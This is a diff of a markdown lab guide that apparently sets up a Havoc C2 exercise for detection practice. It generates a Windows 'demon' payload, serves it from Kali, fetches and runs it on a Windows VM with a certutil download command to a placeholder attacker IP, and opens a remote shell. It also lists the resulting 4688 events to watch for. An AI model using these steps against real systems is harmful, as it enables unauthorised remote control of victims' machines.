@@ -199,23 +199,40 @@ cd /usr/share/havoc
 havoc client
 ```
 
-In Havoc client:
-1. View → Listeners → Add — HTTP, Host: `<KALI_IP>`, Port: 80
-2. Attack → Payload → Generate — Windows EXE, select listener → save as `demon.exe`
+**Step 1 — Create a listener** (Kali, in Havoc client GUI)
+
+View → Listeners → Add
+- Protocol: HTTP
+- Host: `<KALI_IP>`
+- Port: 80
+- Save
+
+This is what the demon will call back to.
+
+**Step 2 — Generate the demon payload** (Kali, in Havoc client GUI)
+
+Attack → Payload → Generate
+- Format: Windows EXE
+- Listener: select the one you just created
+- Save as `demon.exe` to `~/Desktop/`
+
+**Step 3 — Host the payload** (Kali, terminal)
 
 ```bash
-# Host payload on Kali
-cp demon.exe /tmp/
-python3 -m http.server 8080 --directory /tmp/
+python3 -m http.server 8080 --directory ~/Desktop/
 ```
 
-On Windows VM in cmd (as Admin):
+**Step 4 — Download and execute on Windows VM** (cmd as Admin)
+
 ```cmd
 certutil -urlcache -split -f http://<KALI_IP>:8080/demon.exe C:\Windows\Temp\demon.exe
 C:\Windows\Temp\demon.exe
 ```
 
-Demon runs → calls back to Kali → session appears in Havoc client.
+**Step 5 — Get the session**
+
+Demon runs → calls back to Kali team server → session appears in Havoc client.
+Right-click the session → Interact → you have a shell on the victim.
 
 Events: 4688 (certutil + urlcache), 4688 (demon.exe spawned from cmd.exe)
 
